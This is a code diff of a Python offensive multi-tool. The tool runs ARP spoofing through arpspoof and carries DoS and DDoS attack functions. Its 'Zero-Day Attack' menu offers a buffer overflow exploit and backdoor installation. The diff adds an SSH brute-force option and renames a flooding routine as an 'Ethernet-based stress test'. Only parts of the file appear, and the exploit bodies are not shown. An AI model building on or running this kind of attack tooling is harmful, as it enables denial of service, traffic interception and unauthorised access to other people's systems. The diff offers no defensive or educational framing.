@@ -1,19 +1,17 @@
 import requests
 import threading
-import time
+import subprocess
 import aiohttp
 import asyncio
 import random
-import subprocess
-import shutil
-import os
+import time
 import paramiko
 import platform
 from pwn import *
 from bs4 import BeautifulSoup
 from colorama import Fore, init
 
-# Initialize colorama
+# Initialize colorama for colored output
 init(autoreset=True)
 
 # List of high-traffic websites for testing
@@ -151,6 +149,11 @@ def arp_spoofing(target_ip, spoof_ip):
     command = ["arpspoof", "-t", target_ip, spoof_ip]
     subprocess.run(command)
 
+# Ethernet-based Desktop Stress Test
+def ethernet_stress_test(ip):
+    print(f"Running Ethernet-based stress test on {ip}...")
+    network_stress(ip)
+
 # Scrape Chinese textbooks
 def scrape_chinese_textbooks(query):
     results = search(query, num_results=10, lang="zh")
@@ -170,6 +173,7 @@ def dos(target):
         except requests.exceptions.ConnectionError:
             print("[!!!] Connection error!")
 
+# DDOS attack with threading support and options for more threads
 def ddos_attack():
     print(Fore.MAGENTA + """
     DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO        SSSSSSSSSSSSSSS 
@@ -217,7 +221,8 @@ def zero_attack_menu(url_or_ip):
         Admin (Zero-Day Attack) Options:
         [1] Zero-Day Exploit (buffer overflow)
         [2] Backdoor Installation
-        [3] Exit to Main Menu
+        [3] SSH Brute Force
+        [4] Exit to Main Menu
         """)
         sub_choice = input("Select an option: ").strip()
         if sub_choice == "1":
@@ -225,6 +230,8 @@ def zero_attack_menu(url_or_ip):
         elif sub_choice == "2":
             ssh_backdoor(url_or_ip)
         elif sub_choice == "3":
+            ssh_bruteforce(url_or_ip)
+        elif sub_choice == "4":
             break
         else:
             print("Invalid option selected.")
@@ -260,7 +267,7 @@ def display_ui():
         if choice == "1":
             ip_address = input("Enter the IP address: ").strip()
             print("Starting Ethernet-based stress test...")
-            network_stress(ip_address)
+            ethernet_stress_test(ip_address)
         elif choice == "2":
             url_or_ip = input("Enter the URL or IP address to use: ").strip()
             zero_attack(url_or_ip)
